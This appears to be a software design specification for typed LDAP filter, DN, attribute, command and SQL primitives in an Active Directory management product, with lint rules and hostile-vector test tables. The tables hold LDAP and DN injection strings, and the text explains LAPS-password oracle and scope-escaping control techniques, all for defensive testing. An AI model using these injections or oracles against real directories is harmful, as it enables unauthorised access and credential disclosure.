---
title: "Safe primitives: LDAP filters, DNs, attribute codecs, command invocation, SQL"
date: 2026-10-02
updated: 2026-10-02
status: review
owner: heramb
ticket: T-0005
sources_last_checked: 2026-10-02
---

# Safe primitives

Security-relevant strings are never built by hand. Each one has a single typed constructor, every
constructor has a hostile-vector suite, and a lint rule bans the unsafe alternative. This is the
direct countermeasure to PatchIQ's recurring `Sprintf`-built security strings
(`../UEM/knowledge/development/legacy/patchiq-postmortem.md` §11 #1, #10; `knowledge/memory/lessons.md`)
and to ManageEngine's record (21 of 24 ADAudit Plus CVEs in 2024 were SQLi; CVE-2022-28810 was
command injection; `build-feasibility/ad-technical-feasibility.md` §2.2, §2.7). CLAUDE.md rule 5.

**Notation.** In vector tables `\xNN` inside an *input* means the raw byte/char; in *expected*
outputs backslashes are literal. In tables `\|` is a literal `|`. "Error `X`" means a typed error
with stable code `X`; nothing is sent to a DC, interpreter or database.

| # | Primitive (provisional name) | Bans | Tiers (ADR-0001, ratified; matrix in §2) | Implementer | § |
| --- | --- | --- | --- | --- | --- |
| P1 | `ldapfilter`: filter AST, canonical renderer, admin-filter parser | string-built filters; library filter compilation of user input | S, A | directory-engineer | 3 |
| P2 | `dn`: DN parse/build/compare; `ObjectRef` (`<GUID=…>`, `<SID=…>`) | `"CN="+name+","+parent`; `HasSuffix(dn, ou)` scope checks | S, A | directory-engineer | 4 |
| P3 | `attr`: codecs for GUID, SID, FILETIME/Interval, Generalized Time, flag integers (UAC, computed UAC, groupType), `unicodePwd` + `Secret` | ad-hoc byte/int parsing, bit maths in feature code, raw attribute access | S, A; `Secret` and any codec it parses also in N | directory-engineer | 5 |
| P4 | `psx` typed PowerShell operations · `pslit` display quoting · `proc` native process runner | script text with data, `-Command`, `-EncodedCommand`, shells, `.bat`/`.cmd` | S, A, X | backend-engineer (`psx`, `proc`), windows-engineer (sidecar host) | 6 |
| P5 | SQL access: generated queries, tenant context, report compiler, LIKE patterns | `Sprintf`/concatenated SQL, session-level `SET` | S | backend-engineer | 7 |
| P6 | `sd`: binary MS-DTYP security descriptors, SD_FLAGS, diff-based DACL edits, SDDL display-only | hand-sliced `nTSecurityDescriptor` bytes; SDDL on write paths; whole-SD writes | S, A | directory-engineer | sibling doc: `safe-primitives-security-descriptor.md` (T-0028) |

Tier W (web console) implements **no** primitive and tier L (lab and tools) is exempt from the
literal-shape ban but never imported by product code — both rules are in §2.1.

Every ticket that implements or changes a primitive is tagged `security-sensitive`
(`.claude/skills/security-baseline/SKILL.md` §1). Security descriptors are P6, specified in the sibling
`safe-primitives-security-descriptor.md` (T-0028; it follows R1–R9 below). Out of scope here:
output encoders for CSV/XLSX/HTML (T-0029), XML/SAML, JWT and randomness (feasibility §2.7 rows; T-0007).

## 1. Rules that apply to every primitive

- **R1 Typed in, typed out.** Sinks (search, modify, invoke, query) accept only primitive types. The
  types have no public constructor from an unchecked string except the documented parsers, which
  validate. The unsafe call is unrepresentable, not merely discouraged.
- **R2 Escape once, at the boundary, inside the primitive.** No API accepts "already escaped" text;
  no `Raw(…)` escape hatch outside test files.
- **R3 Reject, never repair.** Invalid UTF-8, unpaired surrogates, NUL in strings, out-of-range numbers
  and non-canonical forms in strict mode are typed errors. Never substitute U+FFFD, trim, truncate or
  clamp silently: a repaired password or name is a different value. **This holds at the JSON boundary
  too.** Go's `encoding/json` (v1) does *not* reject bad input: "invalid UTF-8 or invalid UTF-16
  surrogate pairs … are replaced by the Unicode replacement character U+FFFD"
  ([encoding/json][go-json]). A primitive would therefore never see the bad bytes. The API layer
  decodes with a strict decoder: `encoding/json/v2` errors on invalid UTF-8 unless `AllowInvalidUTF8`
  is set ([go-json]), or the raw body is validated first. `Secret` decodes its own JSON (§5.6). Vector:
  PW-16.
- **R4 No Unicode normalisation.** Primitives send exactly the scalar values they were given; AD
  stores what it receives.
- **R5 Bounded.** Every parser caps input size, nesting depth and element count. Caps are named
  constants; values below are provisional until load tests.
- **R6 Errors** carry a stable code and at most a 64-char, log-escaped excerpt of non-secret input.
- **R7 Secrets** use the `Secret` type (§5.6). It formats as redacted and cannot be serialised. We
  zero the buffers we own on a best-effort basis; §5.6 lists the copies we cannot zero. A secret never
  appears in errors, logs, audit details, telemetry, URLs (path or query, and so access logs), crash
  or core dumps, heap profiles, the sync store or any cache.
- **R8 One corpus.** Every vector in this document is also a machine-readable record (§8). Every
  implementation of a primitive, in any tier, runs the records for it in CI.
- **R9 The DC is the authority on AD semantics.** AD compares Unicode strings with sort keys built
  with `NORM_IGNORECASE | NORM_IGNOREKANATYPE | NORM_IGNORENONSPACE | NORM_IGNOREWIDTH`
  ([MS-ADTS string comparison][adts-sort]). No primitive claims to reproduce that. Identity is
  `objectGUID`; uniqueness is asked of the DC; authorisation walks GUID ancestry (feasibility §2.7).

## 2. Stack binding

This document decides, independent of the stack, the semantics, escaping rules, error codes,
vectors, corpus format and the *meaning* of each lint rule. ADR-0001 is **ratified**
(D-0006, 2026-10-02; `knowledge/development/decisions/0001-technology-stack.md`) and binds the
library choice, the concrete lint tools and which tiers implement what. Package paths stay
provisional until T-0004 fixes the zone roots. API sketches use neutral pseudo-signatures; Go, C#
and TypeScript names illustrate the ratified stack. §10 lists what changes if ADR-0001 is amended.

| Tier (ADR-0001) | P1 filter | P2 DN / ObjectRef | P3 codecs, `Secret` | P4 command | P5 SQL |
| --- | --- | --- | --- | --- | --- |
| **S** server (Go) | implements | implements | implements | `psx` client, `pslit`, `proc` | implements |
| **A** host agents (Go) | implements (same package) | implements | implements | `proc`; `psx` client only if a sidecar is declared | — |
| **N** in-process DLLs (Rust) | — | — | `Secret` and only the codecs whose input it parses | none; process creation banned | — |
| **X** sidecars (.NET + PowerShell) | consumes `FilterString` only | consumes GUIDs only | `SecureString` built from `Secret` bytes (§6.1) | `psx` host | — |
| **W** web console (TypeScript) | **none**: shows the server's AST and rendered text | **none**: shows the server's `rdns` | **none**: shows server strings | **none**: shows `DisplayOnlyPowerShell` | none |
| **L** lab and tools (Go, Python, PowerShell) | may hand-build hostile input | may hand-build hostile input | may hand-build hostile input | may hand-build hostile input | may hand-build hostile input |

### 2.1 Tier W and tier L

**Tier W never parses, builds or escapes filter, DN, PowerShell or SQL text.** The console is where a
second copy would appear first: an OU picker splitting DNs on `,`, a TypeScript escaper for filter
previews, a "PowerShell equivalent" panel quoted with `replace(/'/g, "''")`. That last one is
PatchIQ's bug, pasted into a Domain Admin's elevated shell (PSQ-06). The API contract therefore
carries only server-built values:

| Kind | API returns (server → web) | API accepts (web → server) |
| --- | --- | --- |
| Object | `{guid, dn, rdns: [{type, value}]}`. `dn` is for display only. `rdns` are unescaped values rendered by P2 for breadcrumbs. | `guid` only (`GUIDRef`). Never a DN string. |
| Filter | `{ast, text}`. The AST is JSON; `text` is the canonical P1 rendering, for display. | a filter AST (validated as P1 `Filter` input), or `{adminText}`, opaque text that goes to `ParseAdminFilter` |
| PowerShell | `DisplayOnlyPowerShell` rendered by Go `pslit` (§6.2) | nothing. The web never sends script text. |
| SQL | nothing; report definitions are ASTs (§7 rule 3) | a report AST |

Web code renders these values as text through React's default escaping. HTML/CSV encoders are T-0029.
FF-SP3 covers `web/` (§8).

**Tier L** (`lab/`, `tools/`) may build hostile inputs by hand: that is how corpora, fuzz seeds and
attack replays are made. It is exempt from FF-SP3. It is never imported by product code. ADR-0001 F1
keeps its Python and PowerShell out of product zones, and FF-SP1 adds an import rule: no product Go
package imports `lab/…` or `tools/…`, except that the fitness tool itself lives in `tools/`. Lab TLS
uses a lab CA, so tier L needs no exemption from the TLS bans in FF-SP2.

## 3. P1 — LDAP filter builder and admin-filter parser

**Guarantee.** A rendered filter has exactly the structure of its AST: no value can add, remove or
reorder components; attribute names come from the schema; matching rules come from a closed set.

### 3.1 API sketch

```
AttrName                         // opaque; generated schema constants, or ParseAttrName()
ParseAttrName(s, caller) -> AttrName | Error   // RFC 4512 descr/numericoid grammar + schema allowlist + caller may read it
Value.String(s) | Value.Bytes(b) | Value.GUID(g) | Value.SID(s) | Value.DN(d)
     | Value.Int32(i) | Value.Int64(i) | Value.FileTime(t) | Value.GeneralizedTime(t)
And(f…) Or(f…) Not(f)                    // And/Or need >= 1 child
Eq(a,v) Ge(a,v) Le(a,v) Approx(a,v) Present(a)
Substring(a, initial?, any[], final?)    // >= 1 non-empty part
Prefix(a,s)  Contains(a,s)
BitAnd(a, mask:uint32)  BitOr(a, mask:uint32)
InChain(a: DN-syntax link attr, d: DN)   // marked Expensive; caller opts in
Render(f) -> FilterString                // the only producer of FilterString
ParseAdminFilter(s, caller, limits) -> Filter | Error
ParseFilterAST(json, caller, limits) -> Filter | Error   // the tier-W wire form (§2.1); same rules
scope.ScopedSearch(d: Delegation, f: Filter, attrs: AttrName[], page) -> AuthorisedPage   // the only search feature code can call (§3.6)
scope.ReadSecret(ref: GUIDRef, a: SecretAttr, g: SecretReadGrant, c: SecureConn) -> Secret // §3.7
```

There is no public `Search(base, …)`. The raw connector search is internal to the `scope` package
(§3.6), so a feature cannot choose a base, a control or a port.

### 3.2 Canonical rendering

Per [RFC 4515 §3][rfc4515] and [Microsoft's filter syntax][ms-filter]:

- Always escaped: `*`→`\2a`, `(`→`\28`, `)`→`\29`, `\`→`\5c`, NUL→`\00` (RFC 4515 MUST) and `/`→`\2f`
  (Microsoft lists it; harmless under RFC 4515).
- Also escaped, as our canonical choice (RFC 4515 allows escaping any octet): 0x01–0x1F, 0x7F and every
  octet ≥ 0x80. Lower-case hex. The wire value is the same octets either way; the gain is deterministic
  vectors and ASCII-only logs.
- Binary values (GUID, SID, bytes): every octet escaped.
- Bit masks: unsigned decimal. Microsoft: the value "must be a decimal number", e.g.
  `(groupType:1.2.840.113556.1.4.803:=2147483648)` for security groups ([ms-filter]).
- DN-syntax values: render the DN canonically (§4.2), then filter-escape it. Two layers, in that order.

### 3.3 AD rules the builder enforces

1. **Schema allowlist** read at connect (ad-engineering gotcha 15). Unknown attribute → error, never
   "matches nothing".
2. **Constructed attributes are not filterable** (gotcha 12; schema `systemFlags` 0x4
   FLAG_ATTR_IS_CONSTRUCTED, [systemFlags][systemflags]).
3. **Value kind must match syntax.** `objectGUID` takes `Value.GUID` only; a dashed GUID string would
   silently match nothing (gotcha 24). DN-syntax attributes take `Value.DN`.
4. **No substring on DN-syntax attributes.** AD wildcard matching on DN attributes is not supported
   `[UNVERIFIED — lab]`; either way the admin would get a silently empty result.
5. **No empty assertions.** `Eq(a,"")` is an error (absence is `Not(Present(a))`). `Substring` with all
   parts empty is an error: it would render `(a=*)`, presence, the classic widening bug.
6. **Matching rules** limited to bit AND `…803`, bit OR `…804`, `LDAP_MATCHING_RULE_IN_CHAIN` `…1941`
   ([ms-filter]). `:dn:` and any other OID in admin filters → error. `InChain` is expensive on large
   estates (gotcha 9).
7. **Secret attributes** (the set `SecretAttrs`, defined in §3.7: schema-flagged and listed) are
   refused in admin filters and in sort and VLV keys. They never appear in the `attrs` of a general
   search. Code may use them only as `Present()` behind a `SecretPresenceGrant`, or read one value
   through `ReadSecret`. Reason: AD enforces confidentiality against the *bound* identity, which is
   our service account. A help-desk user's `(ms-Mcs-AdmPwd=a*)` would otherwise turn result counts into
   a LAPS-password oracle, and a server-side sort on the attribute would turn result order into one.
8. **Delegation scope is structural.** Feature code calls only `ScopedSearch(delegation, filter,
   attrs)`. The base is the delegation root's `GUIDRef`; the scope, controls, port and referral
   policy are fixed inside the `scope` package (§3.6). The filter composes as `And(scopeFilter,
   userFilter)` and only narrows. Authorisation is still checked on every returned object, and
   counts and pages are computed after that check (security-baseline §7).
9. **Limits (provisional):** value ≤ 16 KiB; rendered filter ≤ 64 KiB; depth ≤ 32; ≤ 512 nodes; `Or`
   fan-out ≤ 256 (batch larger sets).

**Admin-supplied filters** (custom reports, saved searches) are parsed strictly by the RFC 4515
grammar, the whole input must be consumed, rules 1–9 apply, and the *canonical re-rendering* is what
is sent — never the original text. Saved searches store the AST and are re-validated at run time
(schema and the caller's rights may have changed). A DN-valued assertion in an admin filter (e.g.
`(memberOf=…)`, `InChain`) is resolved to an object the caller may read. Otherwise the result count
reveals whether an out-of-scope DN exists (LF-36).

### 3.4 Hostile vectors

| ID | Call / input | Expected | Why |
| --- | --- | --- | --- |
| LF-01 | `Eq(cn, "*)(uid=*")` | `(cn=\2a\29\28uid=\2a)` | classic injection stays one assertion |
| LF-02 | `Eq(cn, "*")` | `(cn=\2a)` | a literal star is not presence |
| LF-03 | `Eq(cn, ")(\|(objectClass=*)")` | `(cn=\29\28\|\28objectClass=\2a\29)` | close-and-reopen attempt |
| LF-04 | `Eq(cn, "\")` | `(cn=\5c)` | lone backslash |
| LF-05 | `Eq(cn, "\2a")` (the three characters backslash 2 a) | `(cn=\5c2a)` | pre-escaped text is data (R2) |
| LF-06 | `Eq(cn, String("a\x00b"))` | error `NulInString` | R3; binary NUL goes via `Value.Bytes` |
| LF-07 | `Eq(objectGUID, GUID 04030201-0605-0807-090a-0b0c0d0e0f10)` | `(objectGUID=\01\02\03\04\05\06\07\08\09\0a\0b\0c\0d\0e\0f\10)` | every byte escaped, stored byte order |
| LF-08 | `Eq(objectGUID, String("04030201-0605-…"))` | error `ValueKindMismatch` | would match nothing |
| LF-09 | `Eq(cn, "Zoë 😀")` | `(cn=Zo\c3\ab \f0\9f\98\80)` | non-ASCII escaped byte-wise |
| LF-10 | `Eq(cn, bytes ff fe)` as String | error `InvalidUTF8` | R3 |
| LF-11 | `Eq(cn, "\xc0\xaf")` (overlong `/`) | error `InvalidUTF8` | overlong encodings are invalid |
| LF-12 | `Eq(cn, "")` | error `EmptyAssertion` | rule 5 |
| LF-13 | `Prefix(cn, "")` | error `EmptySubstring` | would render `(cn=*)` |
| LF-14 | `Prefix(cn, "adm*in")` | `(cn=adm\2ain*)` | only the structural star is bare |
| LF-15 | `Prefix(manager, "CN=Smith")` | error `SubstringOnDN` | rule 4 |
| LF-16 | `Eq(manager, DN "CN=Smith\, John,OU=Sales,DC=corp,DC=example")` | `(manager=CN=Smith\5c, John,OU=Sales,DC=corp,DC=example)` | DN escape, then filter escape |
| LF-17 | `BitAnd(groupType, 0x80000000)` | `(groupType:1.2.840.113556.1.4.803:=2147483648)` | unsigned decimal ([ms-filter]) |
| LF-18 | `BitAnd(userAccountControl, 0x2)` | `(userAccountControl:1.2.840.113556.1.4.803:=2)` | disabled accounts |
| LF-19 | `ParseAttrName("cn=x)(objectClass")` | error `InvalidAttributeName` | attribute-name injection |
| LF-20 | `ParseAttrName("cn;binary")` | error `AttributeOptionsNotAllowed` | options never in filters |
| LF-21 | `Eq(msDS-User-Account-Control-Computed, Int32(16))` | error `ConstructedNotFilterable` | rule 2 |
| LF-22 | `ParseAdminFilter("(ms-Mcs-AdmPwd=a*)", helpdesk)` | error `ForbiddenAttribute` | rule 7 oracle |
| LF-23 | `ParseAdminFilter("(&(objectClass=user)(cn=a))(\|(objectClass=*))")` | error `TrailingInput` | parsers that stop after the first filter |
| LF-24 | `ParseAdminFilter("(cn:1.2.3.4:=x)")`, `("(cn:dn:=x)")` | error `UnsupportedMatchingRule` | rule 6 |
| LF-25 | `ParseAdminFilter` of 10 000 nested `(!(…))` | error `TooDeep`, no stack overflow | R5 |
| LF-26 | `ParseAdminFilter("(cn=\zz)")`, `("(cn=\2)")`, `("(cn=a\)")` | error `InvalidEscape` | malformed escapes |
| LF-27 | `And(Eq(sAMAccountType, 805306368), ParseAdminFilter("(\|(cn=*)(objectClass=*))"))` | `(&(sAMAccountType=805306368)(\|(cn=*)(objectClass=*)))` | scope only narrows |
| LF-28 | `Eq(cn, 20 000-char string)` | error `ValueTooLong` | R5 |
| LF-29 | `Or()` | error `EmptyComposite` | `(\|)` is RFC 4526 absolute-false; never emitted |
| LF-30 | a feature package builds a search with control `1.2.840.113556.1.4.1504` (ASQ) | build error (FF-SP1/FF-SP2): the raw search is not importable; `ScopedSearch` has no control parameter | ASQ follows a DN attribute out of the base (§3.6) |
| LF-31 | `ScopedSearch` whose delegation root GUID now resolves to a deleted object | error `DelegationRootGone`; no fallback to the domain root | a deleted OU must not widen scope |
| LF-32 | DC answers a scoped search with a continuation reference | error `UnexpectedReferral`; not followed; no partial page returned as complete | referral chasing is off (§3.6) |
| LF-33 | `ScopedSearch` on a connection to the GC (3268/3269) | error `GCNotAllowed` | the GC spans every domain |
| LF-34 | `ParseAdminFilter("(msLAPS-EncryptedPasswordHistory=*)")` · `("(msTPM-OwnerInformation=*)")` | error `ForbiddenAttribute` | presence on a secret attribute is a grant, not a filter |
| LF-35 | sort key `ms-Mcs-AdmPwd` · VLV target on `msFVE-RecoveryPassword` | error `ForbiddenSortKey` | ordering oracle |
| LF-36 | admin filter `(memberOf=CN=Project X,OU=Restricted,DC=corp,DC=example)`; the caller cannot read that group | error `ReferencedObjectNotReadable`, not an empty result | existence oracle |
| LF-37 | `ScopedSearch(attrs: [unicodePwd])` · `[msDS-ManagedPassword]` | error `SecretInGeneralSearch` | secrets only via `ReadSecret` |
| LF-38 | lab, schema-driven: for **every** `attributeSchema` with `searchFlags` & (0x80 \| 0x200 \| 0x1000), including a seeded custom attribute flagged 0x200 only | `ParseAdminFilter("(<attr>=*)")` → `ForbiddenAttribute`; `ScopedSearch` attrs → `SecretInGeneralSearch`; sort → `ForbiddenSortKey` | schema-driven set (§3.7) |
| LF-39 | paged `ScopedSearch`: DC returns 1 000 entries, 3 fail per-object authorisation | page holds 997; the reported count is the post-authorisation count; no DC estimate surfaces | counts after authorisation |
| LF-40 | saved search requests show-deleted `…417` · show-recycled `…2064` | error `ControlNotAllowed`; only the named operation `RecycleBinBrowse` sets them | deleted objects live outside every OU |

### 3.5 Lint / fitness rule (bans the unsafe alternative)

- Only the connector package imports the LDAP library (import-boundary rule, FF-SP1).
- Banned outside `ldapfilter`: the library's filter compiler and escaper (go-ldap `CompileFilter`,
  `EscapeFilter`); constructing a search request with a filter string (go-ldap `NewSearchRequest`,
  `SearchRequest{Filter:…}`) outside the connector; in tier X, `DirectorySearcher` and the string
  `SearchRequest` constructors of `System.DirectoryServices.Protocols` (BannedApiAnalyzers).
- Literal-shape scanner (FF-SP3): string literals containing `(&(`, `(|(`, `(objectClass=`,
  `(sAMAccountName=` or `:1.2.840.113556.1.4.` outside `ldapfilter` and tests fail the build.
- Raw search, control constructors and the GC port are confined to `scope` and the connector
  (FF-SP1). In go-ldap that means `Conn.Search`, `SearchWithPaging`, `NewSearchRequest`, `NewControl*`
  and the literals `3268`/`3269`. The OID literal `1.2.840.113556.1.4.1504` and the other §3.6
  escape-control OIDs may appear only in the named-operation table inside `scope` (LF-30).

### 3.6 Scoped search: base, controls, referrals, Global Catalog

A filter can only narrow results, but the request around it can widen them. Several AD controls
and the GC port return objects outside the search base. The `scope` package therefore owns
everything except the filter and the attribute list.

- **Base and scope.** The base is the `GUIDRef` of a delegation root. A delegation with several
  roots runs one search per root, and results are merged and de-duplicated by `objectGUID`. The
  search scope never reaches above the root. If the root is deleted, the result is an error
  (LF-31). A moved root is fine, because the GUID follows the object.
- **Controls are a closed set per operation**, attached inside the connector. A general `ScopedSearch`
  uses only:
  - paged results `…319`;
  - domain scope `…1339`, which "instructs the DC not to generate LDAP continuation references";
  - extended DN `…529`, response-only;
  - SD flags `…801`, only when the T-0028 primitive reads `nTSecurityDescriptor`.

  OIDs and descriptions are from [MS-ADTS LDAP extended controls][adts-controls].
- **Escape controls exist only in named internal operations.** Each named operation has its own
  capability, audit event and security-architect review:

| Control | OID | How it escapes an OU base | Only in |
| --- | --- | --- | --- |
| ASQ | 1.2.840.113556.1.4.1504 | the search runs "against the set of objects named by a specified attribute … on the base object", e.g. every `member` of a group, wherever they live | `GroupMembersExpand`, with per-member authorisation |
| Search options (phantom root) | 1.2.840.113556.1.4.1340 | searches "all NC replicas that are subordinate to the search base, even if the search base is not instantiated on the DC" | `ForestWideLookup` |
| Show deleted | 1.2.840.113556.1.4.417 | tombstones and deleted objects become visible; they sit in `CN=Deleted Objects`, outside every OU | `RecycleBinBrowse`, `RestoreDeleted` |
| Show recycled | 1.2.840.113556.1.4.2064 | adds recycled objects | same |
| Show deactivated link | 1.2.840.113556.1.4.2065 | link values that point to deleted objects | `RestoreDeleted` |
| DirSync / DirSync EX | 1.2.840.113556.1.4.841 / …2090 | returns changes across the whole NC, and changes how confidential attributes are returned ([search flags][adts-searchflags]) | `ChangeTracking` (sync engine), which strips `SecretAttrs` before storage |
| Server-side sort / VLV | 1.2.840.113556.1.4.473 / 2.16.840.1.113730.3.4.9 | the order of results reveals the sort attribute; VLV `contentCount` is computed before our per-object authorisation | internal paging only; never with a `SecretAttrs` key (LF-35) |

  Modify, delete and modify-DN follow the same rule. Tree delete `…805`, cross-domain move `…521`,
  set owner `…2255`, lazy commit `…619` and bypass quota `…2256` are allowed only in named operations.
- **Referrals are never chased.** A continuation reference or referral in a response is an error
  (LF-32). It is never followed, and the page is never returned as complete, because a silently
  partial result is a wrong number. Other domains are reached through connections the admin
  configured per domain. Trusts are explicit inventory, never discovered by following referrals.
- **The Global Catalog** holds a partial attribute set for every domain in the forest, so a search
  there escapes every domain-level delegation. GC connections exist only for named forest-wide
  operations: `ForestWideLookup` resolves a SID or UPN to its domain, or reads universal-group
  membership. Before any display or authorisation decision, the result is re-read from a DC of the
  owning domain.
- **Counts and pages are computed after per-object authorisation** (LF-39). DC-side estimates are
  never shown.

### 3.7 Secret attributes: the set, presence grants, `ReadSecret`

`SecretAttrs` is computed at connect and on every schema-cache refresh. It is the union of:

- **Schema-flagged attributes:** every `attributeSchema` whose `searchFlags` has fCONFIDENTIAL
  `0x80`, fRODCFilteredAttribute `0x200` (member of the RODC filtered attribute set) or
  fPARTITIONSECRET `0x1000` ([MS-ADTS search flags][adts-searchflags]). The filtered attribute set
  is where Microsoft and administrators put attributes that must not reach an RODC. For example,
  `msFVE-KeyPackage` and `msTPM-OwnerInformation` ship with `searchFlags` `0x298`, which is
  0x200 | 0x80 | 0x10 | 0x8 ([msFVE-KeyPackage][a-fvekp], [msTPM-OwnerInformation][a-tpmoi]).
- **A static list**, for attributes an estate may not flag: `unicodePwd`, `dBCSPwd`, `ntPwdHistory`,
  `lmPwdHistory`, `supplementalCredentials`, `userPassword`, `unixUserPassword`, `msDS-ManagedPassword`,
  `ms-Mcs-AdmPwd`, `msLAPS-Password`, `msLAPS-EncryptedPassword`, `msLAPS-EncryptedPasswordHistory`,
  `msLAPS-EncryptedDSRMPassword`, `msLAPS-EncryptedDSRMPasswordHistory` ([Windows LAPS schema][laps-schema]),
  `msFVE-RecoveryPassword`, `msFVE-KeyPackage`, `msTPM-OwnerInformation`, `msPKIAccountCredentials`,
  `msPKIDPAPIMasterKeys`. Display names not in a given forest's schema are ignored. The flags of
  `userPassword` and `unixUserPassword` vary by estate `[UNVERIFIED — lab]`; they are listed regardless.
- **Minus a reviewed exemption list**, which starts empty. An estate whose filtered attribute set
  contains a non-secret attribute that a feature needs gets a per-attribute entry. The entry records
  a reason and needs security-architect review.

Uses:

- **General searches never carry them**: filters (LF-22, LF-34), `attrs` (LF-37), sort and VLV keys
  (LF-35). The lab check LF-38 enumerates the schema, so a newly flagged attribute is covered
  without a code change.
- **`Present(a)` requires a `SecretPresenceGrant`.** This is the "explicit capability". The
  authorisation layer mints it for one request, for (actor, delegation, attribute, operation), when
  the actor's role holds the activeDIQ permission `secret.presence:<attribute>`. Example: a report
  answering "is a BitLocker recovery key escrowed?" or "is a LAPS password set?". The grant cannot
  be serialised. Each use writes an activeDIQ audit event with the actor, attribute, delegation,
  operation and the number of objects matched — never values.
- **`ReadSecret(GUIDRef, SecretAttr, SecretReadGrant, SecureConn) -> Secret`** performs a base-scope
  read of one object. The grant is minted for (actor, target GUID, attribute) after per-object
  authorisation and any re-authentication the owning feature's spec demands. Every call is audited:
  actor, target GUID, attribute, reason and outcome. The result is a `Secret` (§5.6). It is never
  cached, never written to the sync store or snapshots, and never part of a general API response.
  Only the owning feature's reveal endpoint returns it.

## 4. P2 — DN parser/builder and object references

### 4.1 API sketch

```
RDNType                                   // closed enum from schema rDNAttID: CN, OU, DC, O, L, …
DN = [RDN]   RDN = (type: RDNType|OID, value: UnicodeString | OpaqueBytes)   // exactly one AVA
Parse(s, mode: Strict|Lenient) -> DN | Error   // Strict for DC output; Lenient for admin input
Child(parent: DN, t: RDNType, value) -> DN | Error
Render(d) -> DNString                     // canonical, §4.2
Equal(a,b), IsDescendantOf(c,a) -> bool   // display, dedup, grouping only — never identity or authz
ObjectRef = GUIDRef(GUID) | SIDRef(SID) | DNRef(DN)
ObjectRef.Parse(s) / .ForRequest() -> "<GUID=hex32>" | "<SID=hex>" | DNString
ParseExtendedDN(s) -> ExtendedDN{guid, sid?, dn}   // response-only; no conversion back to a request DN
```

### 4.2 Canonical value rendering

Per [RFC 4514 §2.4][rfc4514] plus Microsoft's AD reserved list ([AD DN reserved characters][ms-dn]):

- Backslash-escape `,` `+` `"` `\` `<` `>` `;`; leading `#` → `\#`; leading and trailing space → `\ `.
- Hex-escape (upper case): C0 controls incl. LF `\0A` and CR `\0D`, DEL `\7F`, `=` `\3D`, `/` `\2F`.
  Microsoft lists `=`, `/`, LF and CR as reserved in AD DNs and says `=` must be hex-encoded; `/`
  matters to ADsPath consumers in tier X ([LDAP ADsPath][adspath]).
- Everything else raw UTF-8. Never the `#hex` BER form, never RFC 1779 quoting.
- NUL is rejected (R3), not escaped: AD names do not contain it.

### 4.3 Parsing and AD rules

- RFC 4514 grammar; hex pairs must decode to valid UTF-8; `#hexstring` accepted only for OID-typed
  attributes and kept opaque.
- **Multi-valued RDNs are rejected.** AD disallows them and answers `invalidDNSyntax`
  ([MS-ADTS multivalued RDNs][adts-mvrdn]).
- **Lenient mode** (admin input only) additionally trims unescaped spaces around `,` and `=`. Whether
  AD itself accepts such input is `[UNVERIFIED — lab]`; we normalise before sending either way.
- **Alternative forms are not DNs.** `<GUID=…>`, `<SID=…>`, `<WKGUID=…>` go through `ObjectRef`.
  MS-ADTS: all DCs accept `<GUID=>` as the hex of the binary GUID (dashed form WS2003+), `<SID=>` as hex
  of the binary SID or a SID string; the *extended DN* form (`<GUID=…>;<SID=…>;dn`) is response-only and
  "not accepted as a means of specifying DNs in requests" ([MS-ADTS alternative DN forms][adts-altdn]).
  We emit the hex forms, which every DC accepts. Prefer `GUIDRef` for every modify, delete and modifyDN
  on an existing object.
- **Lengths** come from the schema's `rangeUpper` at connect (`cn` is 64, [cn][a-cn]); enforced by
  `Child()`, not by `Parse()` (DC output is authoritative). Parse caps: ≤ 64 RDNs, ≤ 16 KiB (provisional).

### 4.4 Equality is weaker than AD's — by design

`Equal` compares attribute types case-insensitively and unescaped values with Unicode simple case
folding, so `\,` = `\2C` and `cn=A` = `CN=a`. AD's comparison also ignores width, kana type and
non-spacing marks (R9): `CN=José` and `CN=Jose` may be one name to the DC `[UNVERIFIED — lab]`.
Therefore uniqueness checks ask the DC and still handle `entryAlreadyExists` (68) on add; `Equal`
and `IsDescendantOf` are banned in authorisation code (lint, §4.6).

### 4.5 Hostile vectors

Builder, parent `P` = `OU=Staff,DC=corp,DC=example`; outputs omit `,` + `P` for brevity.

| ID | Call / input | Expected | Why |
| --- | --- | --- | --- |
| DN-B01 | `Child(P, CN, "Smith, John")` | `CN=Smith\, John` | comma |
| DN-B02 | `",OU=Domain Admins"` | `CN=\,OU\3DDomain Admins` | placing the object elsewhere by name |
| DN-B03 | `"a+CN=b"` | `CN=a\+CN\3Db` | multi-valued RDN injection |
| DN-B04 | `" lead"` / `"trail "` | `CN=\ lead` / `CN=trail\ ` | edge spaces are significant |
| DN-B05 | `" "` / `"  "` | `CN=\ ` / `CN=\ \ ` | all-space values |
| DN-B06 | `"#admins"` / `"a#b"` | `CN=\#admins` / `CN=a#b` | leading `#` would mean BER hex |
| DN-B07 | `"\"quoted\""` | `CN=\"quoted\"` | quotes |
| DN-B08 | `"back\slash"` | `CN=back\\slash` | backslash |
| DN-B09 | `"<x>;y"` | `CN=\<x\>\;y` | angle brackets, semicolon |
| DN-B10 | `"line1\nline2"` / `"a\rb"` | `CN=line1\0Aline2` / `CN=a\0Db` | Microsoft reserved LF/CR |
| DN-B11 | `"a/b"` | `CN=a\2Fb` | ADsPath separator |
| DN-B12 | `"a\x00b"` | error `NulInString` | R3 |
| DN-B13 | `""` | error `EmptyRDNValue` | AD requires a value |
| DN-B14 | 65 × `a` as CN | error `ValueTooLong` | `cn` rangeUpper 64 |
| DN-B15 | `"𝔘ser Zoë"` | `CN=𝔘ser Zoë` | non-ASCII stays raw UTF-8 |
| DN-B16 | bytes `ff` | error `InvalidUTF8` | R3 |
| DN-B17 | `ParseRDNType("CN=x,OU")` | error `UnknownRDNType` | the type is an enum, not text |

| ID | Parse input | Expected | Why |
| --- | --- | --- | --- |
| DN-P01 | `CN=evil\,OU=HR,DC=corp,DC=example` | 3 RDNs, first value `evil,OU=HR`; `IsDescendantOf(·, "OU=HR,DC=corp,DC=example")` = false | defeats string-suffix scope checks |
| DN-P02 | `cn=A,ou=HR,dc=corp,dc=example` vs `CN=a,OU=hr,DC=CORP,DC=EXAMPLE` | `Equal` = true | case |
| DN-P03 | `CN=Smith\2C John,DC=x` vs `CN=Smith\, John,DC=x` | `Equal` = true; both render `CN=Smith\, John,DC=x` | escape forms |
| DN-P04 | `CN=a,,DC=x` | error `EmptyRDN` | |
| DN-P05 | `CN=a\` | error `DanglingEscape` | |
| DN-P06 | `CN=a\zz,DC=x` | error `InvalidEscape` | |
| DN-P07 | `CN=a\c3,DC=x` | error `InvalidUTF8` | truncated UTF-8 via hex |
| DN-P08 | `CN=a+CN=b,DC=x` | error `MultiValuedRDN` | AD rejects ([adts-mvrdn]) |
